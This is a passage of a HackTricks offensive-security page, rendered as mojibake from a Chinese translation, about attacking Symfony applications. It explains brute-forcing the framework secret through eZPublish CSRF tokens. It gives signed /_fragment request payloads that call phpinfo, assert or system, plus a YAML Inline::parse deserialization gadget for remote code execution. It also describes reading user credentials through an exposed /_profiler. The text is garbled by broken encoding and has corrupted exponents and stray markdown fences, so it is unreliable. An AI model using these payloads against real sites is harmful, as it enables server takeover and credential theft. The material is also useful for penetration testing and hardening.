åœ¨è¿™ç¯‡åšå®¢æ–‡ç« çš„å¼€å¤´ï¼Œæˆ‘ä»¬è¯´è¿‡Symfonyçš„å¯†é’¥æœ‰å‡ ä¸ªç”¨é€”ã€‚å…¶ä¸­ä¸€ä¸ªç”¨é€”æ˜¯å®ƒä¹Ÿç”¨äºç”ŸæˆCSRFä»¤ç‰Œã€‚`secret`çš„å¦ä¸€ä¸ªç”¨é€”æ˜¯ç­¾ç½²è®°ä½æˆ‘cookieã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä½¿ç”¨ä»–è‡ªå·±çš„CSRFä»¤ç‰Œæˆ–è®°ä½æˆ‘cookieæ¥æš´åŠ›ç ´è§£`secret`çš„å€¼ã€‚

_å¯¹è¿™äº›ä»¤ç‰Œçš„æ„é€ è¿›è¡Œé€†å‘å·¥ç¨‹çš„å·¥ä½œç•™ç»™è¯»è€…ä½œä¸ºç»ƒä¹ ã€‚_

### æ›´è¿›ä¸€æ­¥ï¼šeZPublish <a href="#going-further-ezpublish" id="going-further-ezpublish"></a>

ä½œä¸ºä¸€ä¸ªä¾‹å­ï¼Œè¯´æ˜å¦‚ä½•é€šè¿‡æš´åŠ›ç ´è§£å¯†é’¥æ¥å®ç°ä»£ç æ‰§è¡Œï¼Œæˆ‘ä»¬å°†çœ‹åˆ°å¦‚ä½•æ‰¾å‡ºeZPublish 2014.07çš„å¯†é’¥ã€‚

#### å¯»æ‰¾æš´åŠ›ç ´è§£ææ–™ <a href="#finding-bruteforce-material" id="finding-bruteforce-material"></a>

eZPublishè¿™æ ·ç”Ÿæˆå®ƒçš„CSRFä»¤ç‰Œï¼š
```php
# ./ezpublish_legacy/extension/ezformtoken/event/ezxformtoken.php
self::$token = sha1( self::getSecret() . self::getIntention() . session_id() );
```
ä¸ºäº†æ„å»ºè¿™ä¸ªä»¤ç‰Œï¼ŒeZP ä½¿ç”¨äº†æˆ‘ä»¬å·²çŸ¥çš„ä¸¤ä¸ªå€¼å’Œä¸€ä¸ªç§˜å¯†ï¼š`getIntention()` æ˜¯ç”¨æˆ·å°è¯•çš„æ“ä½œï¼ˆä¾‹å¦‚ `authenticate`ï¼‰ï¼Œ`session_id()` æ˜¯ PHP ä¼šè¯ IDï¼Œè€Œ `getSecret()`ï¼Œå—¯ï¼Œå°±æ˜¯ Symfony çš„ `secret`ã€‚

ç”±äº CSRF ä»¤ç‰Œå¯ä»¥åœ¨ä¸€äº›è¡¨å•ä¸Šæ‰¾åˆ°ï¼Œæˆ‘ä»¬ç°åœ¨æœ‰äº†æš´åŠ›ç ´è§£ç§˜å¯†çš„ææ–™ã€‚

ä¸å¹¸çš„æ˜¯ï¼ŒezPublish é›†æˆäº†æ¥è‡ª sensiolabs çš„ä¸€ä¸ªåŒ…ï¼Œ[sensio/distribution-bundle](https://packagist.org/packages/sensio/distribution-bundle)ã€‚è¿™ä¸ªåŒ…ç¡®ä¿ç§˜å¯†å¯†é’¥æ˜¯éšæœºçš„ã€‚å®ƒåœ¨å®‰è£…æ—¶è¿™æ ·ç”Ÿæˆå®ƒï¼š
```php
# ./vendor/sensio/distribution-bundle/Sensio/Bundle/DistributionBundle/Configurator/Step/SecretStep.php

private function generateRandomSecret()
{
return hash('sha1', uniqid(mt_rand()));
}
```
è¿™çœ‹èµ·æ¥å¾ˆéš¾è¿›è¡Œæš´åŠ›ç ´è§£ï¼š`mt_rand()` å¯ä»¥äº§ç”Ÿ 2^31 ä¸ªä¸åŒçš„å€¼ï¼Œè€Œ `uniqid()` æ˜¯åŸºäºå½“å‰æ—¶é—´æˆ³æ„å»ºçš„ï¼ˆåŒ…æ‹¬å¾®ç§’ï¼‰ã€‚
```php
// Simplified uniqid code

struct timeval tv;
gettimeofday(&tv, NULL);
return strpprintf(0, "%s%08x%05x", prefix, tv.tv_sec, tv.tv_usec);
```
#### æ³„éœ²æ—¶é—´æˆ³ <a href="#disclosing-the-timestamp" id="disclosing-the-timestamp"></a>

å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬çŸ¥é“è¿™ä¸ªç§˜å¯†æ˜¯åœ¨å®‰è£…çš„æœ€åä¸€æ­¥ç”Ÿæˆçš„ï¼Œå°±åœ¨ç½‘ç«™è®¾ç½®å®Œæˆä¹‹åã€‚è¿™æ„å‘³ç€æˆ‘ä»¬å¯èƒ½å¯ä»¥æ³„éœ²ç”¨äºç”Ÿæˆè¿™ä¸ªå“ˆå¸Œçš„æ—¶é—´æˆ³ã€‚

ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨æ—¥å¿—ï¼ˆä¾‹å¦‚ `/var/log/storage.log`ï¼‰ï¼›å¯ä»¥æ³„éœ²ç¬¬ä¸€æ¬¡åˆ›å»ºç¼“å­˜æ¡ç›®çš„æ—¶é—´ã€‚ç¼“å­˜æ¡ç›®æ˜¯åœ¨è°ƒç”¨ `generateRandomSecret()` ä¹‹åç«‹å³åˆ›å»ºçš„ã€‚

_ç¤ºä¾‹æ—¥å¿—å†…å®¹ï¼šæ—¶é—´æˆ³ä¸ç”¨äºè®¡ç®—ç§˜å¯†çš„æ—¶é—´æˆ³ç±»ä¼¼_

![5](https://www.ambionics.io/images/symfony-secret-fragment/5.png)

å¦‚æœæ²¡æœ‰æ—¥å¿—å¯ç”¨ï¼Œå¯ä»¥ä½¿ç”¨ eZPublish çš„éå¸¸å¼ºå¤§çš„æœç´¢å¼•æ“æ¥æ‰¾åˆ°ç½‘ç«™æœ€åˆå…ƒç´ çš„åˆ›å»ºæ—¶é—´ã€‚å®é™…ä¸Šï¼Œå½“ç½‘ç«™åˆ›å»ºæ—¶ï¼Œæ•°æ®åº“ä¸­ä¼šæ’å…¥è®¸å¤šæ—¶é—´æˆ³ã€‚è¿™æ„å‘³ç€ eZPublish ç½‘ç«™åˆå§‹æ•°æ®çš„æ—¶é—´æˆ³ä¸ç”¨äºè®¡ç®— `uniqid()` çš„æ—¶é—´æˆ³ç›¸åŒã€‚æˆ‘ä»¬å¯ä»¥æŸ¥æ‰¾ `landing_page` _ContentObject_ å¹¶æ‰¾å‡ºå…¶æ—¶é—´æˆ³ã€‚

## æš´åŠ›ç ´è§£ç¼ºå¤±çš„ä½ <a href="#bruteforcing-the-missing-bits" id="bruteforcing-the-missing-bits"></a>

æˆ‘ä»¬ç°åœ¨çŸ¥é“äº†ç”¨äºè®¡ç®—ç§˜å¯†çš„æ—¶é—´æˆ³ï¼Œä»¥åŠä»¥ä¸‹å½¢å¼çš„å“ˆå¸Œï¼š
```php
$random_value = mt_rand();
$timestamp_hex = sprintf("%08x%05x", $known_timestamp, $microseconds);
$known_plaintext = '<intention><sessionID>';
$known_hash = sha1(sha1(mt_rand() . $timestamp_hex) . $known_plaintext);
```
è¿™ä½¿æˆ‘ä»¬æ€»å…±æœ‰ 231 \* 106 ç§å¯èƒ½æ€§ã€‚ä½¿ç”¨ [hashcat](https://hashcat.net) å’Œä¸€ç»„å¥½çš„ GPUï¼Œè¿™ä¼¼ä¹æ˜¯å¯è¡Œçš„ï¼Œä½† hashcat å¹¶æ²¡æœ‰æä¾› `sha1(sha1($pass).$salt)` å†…æ ¸ã€‚å¹¸è¿çš„æ˜¯ï¼Œæˆ‘ä»¬å®ç°äº†å®ƒï¼æ‚¨å¯ä»¥åœ¨[è¿™é‡Œæ‰¾åˆ°æ‹‰å–è¯·æ±‚](https://github.com/hashcat/hashcat/pull/2536)ã€‚

ä½¿ç”¨æˆ‘ä»¬æ‹¥æœ‰ 8 ä¸ª GPU çš„ç ´è§£æœºå™¨ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ _20 å°æ—¶å†…_ ç ´è§£è¿™ä¸ªå“ˆå¸Œã€‚

è·å–å“ˆå¸Œåï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ `/_fragment` æ¥æ‰§è¡Œä»£ç ã€‚

## ç»“è®º <a href="#conclusion" id="conclusion"></a>

Symfony ç°åœ¨æ˜¯è®¸å¤š PHP åº”ç”¨ç¨‹åºçš„æ ¸å¿ƒç»„ä»¶ã€‚å› æ­¤ï¼Œä»»ä½•å½±å“æ¡†æ¶çš„å®‰å…¨é£é™©éƒ½ä¼šå½±å“å¤§é‡ç½‘ç«™ã€‚æ­£å¦‚æœ¬æ–‡æ‰€ç¤ºï¼Œæ— è®ºæ˜¯å¼±ç§˜å¯†è¿˜æ˜¯å½±å“è¾ƒå°çš„æ¼æ´ï¼Œéƒ½å…è®¸æ”»å‡»è€…è·å¾—**è¿œç¨‹ä»£ç æ‰§è¡Œ**ã€‚

ä½œä¸ºä¸€ä¸ªè“é˜Ÿæˆå‘˜ï¼Œä½ åº”è¯¥æŸ¥çœ‹ä½ æ‰€æœ‰ä¾èµ– Symfony çš„ç½‘ç«™ã€‚å³ä½¿æ˜¯æœ€æ–°çš„è½¯ä»¶ä¹Ÿä¸èƒ½æ’é™¤æ¼æ´ï¼Œå› ä¸ºç§˜å¯†å¯†é’¥æ˜¯åœ¨äº§å“é¦–æ¬¡å®‰è£…æ—¶ç”Ÿæˆçš„ã€‚å› æ­¤ï¼Œå¦‚æœä½ å‡ å¹´å‰åˆ›å»ºäº†ä¸€ä¸ªåŸºäº Symfony-3.x çš„ç½‘ç«™ï¼Œå¹¶ä¸€ç›´ä¿æŒæ›´æ–°ï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½ç§˜å¯†å¯†é’¥ä»ç„¶æ˜¯é»˜è®¤çš„ã€‚

## åˆ©ç”¨ <a href="#exploitation" id="exploitation"></a>

### ç†è®º <a href="#theory" id="theory"></a>

é¦–å…ˆï¼Œåœ¨åˆ©ç”¨è¿™ä¸ªæ¼æ´æ—¶ï¼Œæˆ‘ä»¬æœ‰å‡ ä»¶äº‹éœ€è¦æ‹…å¿ƒï¼š

* HMAC ä½¿ç”¨**å®Œæ•´çš„ URL**è®¡ç®—ã€‚å¦‚æœç½‘ç«™ä½äºåå‘ä»£ç†ä¹‹åï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨æœåŠ¡çš„å†…éƒ¨ URL è€Œä¸æ˜¯æˆ‘ä»¬å‘é€æœ‰æ•ˆè½½è·çš„ URLã€‚ä¾‹å¦‚ï¼Œå†…éƒ¨ URL å¯èƒ½æ˜¯ HTTP è€Œä¸æ˜¯ HTTPSã€‚
* HMAC çš„ç®—æ³•å¤šå¹´æ¥å‘ç”Ÿäº†å˜åŒ–ï¼šä¹‹å‰æ˜¯ **SHA-1**ï¼Œç°åœ¨æ˜¯ **SHA-256**ã€‚
* ç”±äº Symfony ä»è¯·æ±‚ä¸­åˆ é™¤äº† `_hash` å‚æ•°ï¼Œç„¶åå†æ¬¡ç”Ÿæˆ URLï¼Œæˆ‘ä»¬éœ€è¦åœ¨å®ƒæ‰€åšçš„ç›¸åŒ URL ä¸Šè®¡ç®—å“ˆå¸Œã€‚
* å¯ä»¥ä½¿ç”¨è®¸å¤šç§˜å¯†ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦æ£€æŸ¥å®ƒä»¬æ‰€æœ‰ã€‚
* åœ¨æŸäº› PHP ç‰ˆæœ¬ä¸Šï¼Œæˆ‘ä»¬ä¸èƒ½è°ƒç”¨å…·æœ‰â€œæŒ‰å¼•ç”¨â€å‚æ•°çš„å‡½æ•°ï¼Œä¾‹å¦‚ `system($command, &$return_value)`ã€‚
* åœ¨æŸäº› Symfony ç‰ˆæœ¬ä¸Šï¼Œ`_controller` ä¸èƒ½æ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œå®ƒå¿…é¡»æ˜¯ä¸€ä¸ªæ–¹æ³•ã€‚æˆ‘ä»¬éœ€è¦æ‰¾åˆ°ä¸€ä¸ªå…è®¸æˆ‘ä»¬æ‰§è¡Œä»£ç çš„ Symfony æ–¹æ³•ã€‚

å¦ä¸€æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ä¸€äº›äº‹æƒ…ï¼š

* ä½¿ç”¨æ— å‚æ•°æˆ–æ— æ•ˆå“ˆå¸Œè®¿é—® `/_fragment` åº”è¿”å› `403`ã€‚
* ä½¿ç”¨æœ‰æ•ˆå“ˆå¸Œä½†æ²¡æœ‰æœ‰æ•ˆæ§åˆ¶å™¨è®¿é—® `/_fragment` åº”äº§ç”Ÿ `500`ã€‚

æœ€åä¸€ç‚¹å…è®¸æˆ‘ä»¬åœ¨ä¸æ‹…å¿ƒä¹‹åè¦è°ƒç”¨å“ªä¸ªå‡½æ•°æˆ–æ–¹æ³•çš„æƒ…å†µä¸‹æµ‹è¯•ç§˜å¯†å€¼ã€‚

### å®è·µ <a href="#practice" id="practice"></a>

å‡è®¾æˆ‘ä»¬æ­£åœ¨æ”»å‡» `https://target.com/_fragment`ã€‚ä¸ºäº†èƒ½å¤Ÿæ­£ç¡®ç­¾åä¸€ä¸ª URLï¼Œæˆ‘ä»¬éœ€è¦çŸ¥é“ï¼š

* å†…éƒ¨ URLï¼šå®ƒå¯èƒ½æ˜¯ `https://target.com/_fragment`ï¼Œæˆ–è€…å¯èƒ½æ˜¯ `http://target.com/_fragment`ï¼Œæˆ–è€…å¯èƒ½æ˜¯å®Œå…¨ä¸åŒçš„ä¸œè¥¿ï¼ˆä¾‹å¦‚ `http://target.website.internal`ï¼‰ï¼Œæˆ‘ä»¬æ— æ³•çŒœæµ‹
* ç§˜å¯†å¯†é’¥ï¼šæˆ‘ä»¬æœ‰ä¸€ä¸ªå¸¸ç”¨ç§˜å¯†å¯†é’¥åˆ—è¡¨ï¼Œä¾‹å¦‚ `ThisTokenIsNotSoSecretChangeIt`ï¼Œ`ThisEzPlatformTokenIsNotSoSecret_PleaseChangeIt` ç­‰ã€‚
* ç®—æ³•ï¼šSHA1 æˆ– SHA256

æˆ‘ä»¬è¿˜ä¸éœ€è¦æ‹…å¿ƒæœ‰æ•ˆè½½è·ï¼ˆ`_path` çš„å†…å®¹ï¼‰ï¼Œå› ä¸ºæ­£ç¡®ç­¾åçš„ URL ä¸ä¼šå¯¼è‡´æŠ›å‡º `AccessDeniedHttpException`ï¼Œå› æ­¤ä¸ä¼šå¯¼è‡´ `403`ã€‚å› æ­¤ï¼Œæ¼æ´åˆ©ç”¨å°†å°è¯•æ¯ä¸ªï¼ˆç®—æ³•ï¼ŒURLï¼Œç§˜å¯†ï¼‰ç»„åˆï¼Œç”Ÿæˆä¸€ä¸ª URLï¼Œå¹¶æ£€æŸ¥å®ƒæ˜¯å¦ä¸äº§ç”Ÿ `403` çŠ¶æ€ç ã€‚

_æ²¡æœ‰ `_path` å‚æ•°å‘ `/_fragment` å‘å‡ºçš„æœ‰æ•ˆè¯·æ±‚_

![6](https://www.ambionics.io/images/symfony-secret-fragment/6.png)

æ­¤æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥ç­¾åä»»ä½• `/_fragment` URLï¼Œè¿™æ„å‘³ç€å®ƒæ˜¯ä¸€ä¸ªä¿è¯çš„ RCEã€‚åªæ˜¯ä¸€ä¸ªå…³äºè¦è°ƒç”¨ä»€ä¹ˆçš„é—®é¢˜ã€‚

ç„¶åï¼Œæˆ‘ä»¬éœ€è¦æ‰¾å‡ºæˆ‘ä»¬æ˜¯å¦å¯ä»¥ç›´æ¥è°ƒç”¨å‡½æ•°ï¼Œæˆ–è€…æˆ‘ä»¬éœ€è¦ä½¿ç”¨ç±»æ–¹æ³•ã€‚æˆ‘ä»¬å¯ä»¥é¦–å…ˆå°è¯•æœ€ç›´æ¥çš„æ–¹æ³•ï¼Œä½¿ç”¨åƒ `phpinfo ([ int $what = INFO_ALL ] )` è¿™æ ·çš„å‡½æ•°ï¼ˆ[æ–‡æ¡£](https://www.php.net/manual/en/function.phpinfo.php)ï¼‰ã€‚`_path` GET å‚æ•°çœ‹èµ·æ¥ä¼šæ˜¯è¿™æ ·ï¼š
```
_controller=phpinfo
&what=-1
```
URLå°†å¦‚ä¸‹æ‰€ç¤ºï¼š

`http://target.com/_fragment?_path=_controller%3Dphpinfo%26what%3D-1&_hash=...`

å¦‚æœHTTPå“åº”æ˜¾ç¤ºäº†ä¸€ä¸ª`phpinfo()`é¡µé¢ï¼Œæˆ‘ä»¬å°±æˆåŠŸäº†ã€‚ç„¶åæˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨å¦ä¸€ä¸ªå‡½æ•°ï¼Œæ¯”å¦‚`assert`ï¼š

_ä½¿ç”¨`_controller=assert`çš„ç¤ºä¾‹è¾“å‡º_

![7](https://www.ambionics.io/images/symfony-secret-fragment/7.png)

å¦åˆ™ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬éœ€è¦ä½¿ç”¨ç±»æ–¹æ³•ã€‚ä¸€ä¸ªå¥½çš„å€™é€‰æ˜¯`Symfony\Component\Yaml\Inline::parse`ï¼Œè¿™æ˜¯ä¸€ä¸ªå†…ç½®çš„Symfonyç±»ï¼Œå› æ­¤å®ƒå­˜åœ¨äºSymfonyç½‘ç«™ä¸Šã€‚

æ˜¾ç„¶ï¼Œè¿™ä¸ªæ–¹æ³•è§£æä¸€ä¸ªYAMLè¾“å…¥å­—ç¬¦ä¸²ã€‚Symfonyçš„[YAML](https://yaml.org)è§£æå™¨æ”¯æŒ`php/object`æ ‡ç­¾ï¼Œå®ƒä¼šä½¿ç”¨`unserialize()`å°†åºåˆ—åŒ–çš„è¾“å…¥å­—ç¬¦ä¸²è½¬æ¢æˆå¯¹è±¡ã€‚è¿™è®©æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æˆ‘ä»¬æœ€å–œæ¬¢çš„PHPå·¥å…·ï¼Œ[PHPGGC](https://github.com/ambionics/phpggc)ï¼

è¿™ä¸ªæ–¹æ³•çš„åŸå‹éšç€æ—¶é—´çš„æ¨ç§»è€Œæ”¹å˜ã€‚ä¾‹å¦‚ï¼Œè¿™é‡Œæœ‰ä¸‰ä¸ªä¸åŒçš„åŸå‹ï¼š
```
public static function parse($value, $flags, $references);
public static function parse($value, $exceptionOnInvalidType, $objectSupport);
public static function parse($value, $exceptionOnInvalidType, $objectSupport, $objectForMap, $references);
```
```markdown
è€Œä¸æ˜¯ä¸ºè¿™äº›æ¯ä¸€ä¸ªæ„å»º `_path`ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™æ ·ä¸€ä¸ªäº‹å®ï¼šå¦‚æœæˆ‘ä»¬æä¾›ä¸€ä¸ªä¸æ–¹æ³•åŸå‹ä¸åŒ¹é…çš„å‚æ•°åç§°ï¼Œå®ƒå°†è¢«å¿½ç•¥ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥å‘æ–¹æ³•ä¸­æ·»åŠ æ¯ä¸€ä¸ªå¯èƒ½çš„å‚æ•°ï¼Œè€Œä¸ç”¨æ‹…å¿ƒå®é™…çš„åŸå‹ã€‚

å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è¿™æ ·æ„å»º `_path`ï¼š
```
```
_controller=Symfony\Component\Yaml\Inline::parse
&value=!php/object O:32:"Monolog\Handler\SyslogUdpHandler":...
&flags=516
&exceptionOnInvalidType=0
&objectSupport=1
&objectForMap=0
&references=
&flags=516
```
æˆ‘ä»¬å¯ä»¥å°è¯•ä½¿ç”¨`phpinfo()`ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰æ•ˆã€‚å¦‚æœæœ‰æ•ˆï¼Œæˆ‘ä»¬å¯ä»¥æ”¹ç”¨`system()`ã€‚

_ä½¿ç”¨`Inline::parse`å’Œåºåˆ—åŒ–æœ‰æ•ˆè½½è·çš„ç¤ºä¾‹è¾“å‡º_

![8](https://www.ambionics.io/images/symfony-secret-fragment/8.png)

å› æ­¤ï¼Œæ¼æ´åˆ©ç”¨å°†éå†æ¯ä¸€ç§å¯èƒ½çš„å˜é‡ç»„åˆï¼Œç„¶åå°è¯•ä¸¤ç§åˆ©ç”¨æ–¹æ³•ã€‚ä»£ç å¯åœ¨[æˆ‘ä»¬çš„GitHub](https://github.com/ambionics/symfony-exploits)ä¸Šè·å–ã€‚

## è®¿é—®symfony /\_profilerä¿¡æ¯

![f:id:flattsecurity:20201021204553p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204553.png)

å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œé¡µé¢å³ä¸‹è§’æœ‰ä¸€ä¸ª`sf`æ ‡å¿—ã€‚å½“Symfonyå¤„äºè°ƒè¯•æ¨¡å¼æ—¶ä¼šæ˜¾ç¤ºè¿™ä¸ªæ ‡å¿—ã€‚æœ‰äº›æƒ…å†µä¸‹è¿™ä¸ªæ ‡å¿—å¯èƒ½ä¸ä¼šæ˜¾ç¤ºï¼Œæ‰€ä»¥å°è¯•è®¿é—®`/_profiler`ï¼Œä½ å°†çœ‹åˆ°ä¸‹é¢æ˜¾ç¤ºçš„é¡µé¢

![f:id:flattsecurity:20201021204605p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204605.png)

è¿™ä¸ªåŠŸèƒ½ç§°ä¸ºSymfony Profilerï¼Œäº’è”ç½‘ä¸Šå…³äºè¿™ä¸ªåŠŸèƒ½çš„ä¿¡æ¯ä¸å¤šã€‚è¿™ä¸ªåŠŸèƒ½çš„ç›®çš„éå¸¸æ˜ç¡®ï¼›å®ƒåœ¨å‡ºç°é”™è¯¯æˆ–bugæ—¶å¸®åŠ©ä½ è°ƒè¯•ã€‚å½“ç„¶ï¼Œè¿™ä¸ªåŠŸèƒ½åªèƒ½åœ¨å¯ç”¨è°ƒè¯•æ¨¡å¼æ—¶ä½¿ç”¨ã€‚

Symfonyæ¡†æ¶æœ¬èº«éå¸¸å®‰å…¨ï¼Œä½†å¯ç”¨è°ƒè¯•æ¨¡å¼ä¼šä½¿è¿™ä¸ªæ¡†æ¶å˜å¾—æå…¶è„†å¼±ã€‚ä¾‹å¦‚ï¼ŒProfileræœ‰ä¸€ä¸ªå«åšProfile Searchçš„åŠŸèƒ½ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚

![f:id:flattsecurity:20201021204624p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204624.png)

å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œä½ å¯ä»¥è®¿é—®å‘é€åˆ°æœåŠ¡å™¨çš„æ‰€æœ‰è¯·æ±‚ã€‚é€šè¿‡ç‚¹å‡»ä»¤ç‰Œä¸­çš„å“ˆå¸Œå€¼ï¼Œä½ ä¼šçœ‹åˆ°æ‰€æœ‰POSTå‚æ•°éƒ½å¯ä»¥è¢«è¯»å–ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚åˆ©ç”¨è¿™ä¸ªåŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥åŠ«æŒç®¡ç†å‘˜å’Œç”¨æˆ·çš„è´¦æˆ·å‡­è¯ã€‚

![f:id:flattsecurity:20201021204637p:plain](https://cdn-ak.f.st-hatena.com/images/fotolife/f/flattsecurity/20201021/20201021204637.png)

### å…¶ä»–å¯ç”¨è°ƒè¯•çš„ç«¯ç‚¹

ä½ è¿˜åº”è¯¥æ£€æŸ¥è¿™äº›URLï¼š

* **https://example.com/app\_dev.php/\_profiler**
* **https://example.com/app\_dev.php**\\

## å‚è€ƒèµ„æ–™

* [**https://www.ambionics.io/blog/symfony-secret-fragment**](https://www.ambionics.io/blog/symfony-secret-fragment)
* [**https://flattsecurity.hatenablog.com/entry/2020/11/02/124807**](https://flattsecurity.hatenablog.com/entry/2020/11/02/124807)
* [**https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144**](https://infosecwriteups.com/how-i-was-able-to-find-multiple-vulnerabilities-of-a-symfony-web-framework-web-application-2b82cd5de144)

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æ”»å‡»ç›´åˆ°æˆä¸ºä¸“å®¶ï¼Œé€šè¿‡</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœä½ æƒ³åœ¨**HackTricks**ä¸Šçœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**æˆ–**ä¸‹è½½HackTricksçš„PDF**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså•†å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTsç³»åˆ—**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ–åœ¨**Twitter** ğŸ¦ ä¸Š**å…³æ³¨**æˆ‘ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥**åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>
